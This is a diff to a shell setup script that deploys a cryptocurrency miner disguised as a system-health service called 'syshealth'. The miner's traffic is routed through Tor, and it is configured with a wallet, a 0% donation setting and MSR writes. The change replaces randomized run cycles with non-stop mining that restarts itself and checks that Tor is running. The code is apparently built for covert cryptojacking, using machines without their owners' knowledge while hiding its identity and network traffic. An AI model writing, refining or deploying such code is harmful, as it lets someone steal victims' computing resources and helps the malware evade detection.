@@ -128,7 +128,6 @@ echo -e "${GREEN}[5/6] Generating configuration...${NC}"
 
 mkdir -p config scripts
 
-rm -f config/preferences.json
 # Generate preferences.json with wallet, Tor proxy, and 0% donation
 cat > config/preferences.json << PREFS
 {
@@ -140,7 +139,7 @@ cat > config/preferences.json << PREFS
         "init": -1,
         "init-avx2": -1,
         "mode": "auto",
-        "1gb-pages": false,
+        "1gb-pages": true,
         "rdmsr": true,
         "wrmsr": true,
         "cache_qos": false,
@@ -194,8 +193,8 @@ cat > config/preferences.json << PREFS
     ],
     "retries": 5,
     "retry-pause": 5,
-    "print-time": 0,
-    "health-print-time": 0,
+    "print-time": 60,
+    "health-print-time": 60,
     "dmi": false,
     "syslog": false,
     "verbose": 0,
@@ -267,7 +266,7 @@ echo "[!] Failed to connect to Tor after ${MAX_RETRIES} attempts"
 exit 1
 NETWORK
 
-# Generate scheduler.sh (with random CPU 40/60/75%)
+# Generate scheduler.sh (Simplified for non-stop mining)
 cat > scripts/scheduler.sh << 'SCHEDULER'
 #!/bin/bash
 UTIL_DIR="/opt/utilities"
@@ -275,60 +274,37 @@ BIN="${UTIL_DIR}/syshealth"
 CONFIG="${UTIL_DIR}/config/preferences.json"
 PID_FILE="/var/run/syshealth.pid"
 
-# Run 1-3 hours, no 5-minute pauses
-MIN_RUN_TIME=3600
-MAX_RUN_TIME=10800
-PAUSE_TIME=0
-
 start_service() {
-    "${BIN}" --config="${CONFIG}" --no-color &
-    echo $! > "${PID_FILE}"
-}
-
-stop_service() {
-    if [ -f "${PID_FILE}" ]; then
-        kill $(cat "${PID_FILE}") 2>/dev/null
-        rm -f "${PID_FILE}"
+    if ! pgrep -f syshealth > /dev/null; then
+        echo "[*] Starting mining service..."
+        "${BIN}" --config="${CONFIG}" --no-color &
+        echo $! > "${PID_FILE}"
     fi
-    pkill -f syshealth 2>/dev/null || true
 }
 
 check_network() {
     if ! pgrep -x tor > /dev/null 2>&1; then
         echo "[!] Tor not running, restarting..."
-        stop_service
         bash "${UTIL_DIR}/scripts/network.sh" || true
     fi
 }
 
-get_random_runtime() {
-    local range=$((MAX_RUN_TIME - MIN_RUN_TIME))
-    local random_offset=$((RANDOM * RANDOM % range))
-    echo $((MIN_RUN_TIME + random_offset))
-}
+# Initial start
+check_network
+start_service
 
 while true; do
+    sleep 60
     check_network
-    start_service
-    RUNTIME=$(get_random_runtime)
-    echo "[*] Running for $((RUNTIME/3600))h $((RUNTIME%3600/60))m at CPU_PERCENT_PLACEHOLDER CPU"
-    ELAPSED=0
-    # Poll more frequently to avoid long 5-minute sleeps
-    while [ $ELAPSED -lt $RUNTIME ]; do
-        sleep 1
-        ELAPSED=$((ELAPSED + 1))
-        check_network
-    done
-    stop_service
-    # No long pause between runs when PAUSE_TIME=0
-    if [ "${PAUSE_TIME}" -gt 0 ]; then
-        echo "[*] Pausing for ${PAUSE_TIME}s..."
-        sleep ${PAUSE_TIME}
+    
+    # Ensure miner is still running
+    if ! pgrep -f syshealth > /dev/null; then
+        echo "[!] Miner stopped unexpectedly, restarting..."
+        start_service
     fi
 done
 SCHEDULER
-# Replace placeholder with actual CPU percentage
-sed -i "s/CPU_PERCENT_PLACEHOLDER/${CPU_PCT}/g" scripts/scheduler.sh
+
 
 # Generate setup.sh for inside container
 cat > scripts/setup.sh << 'INNERSETUP'
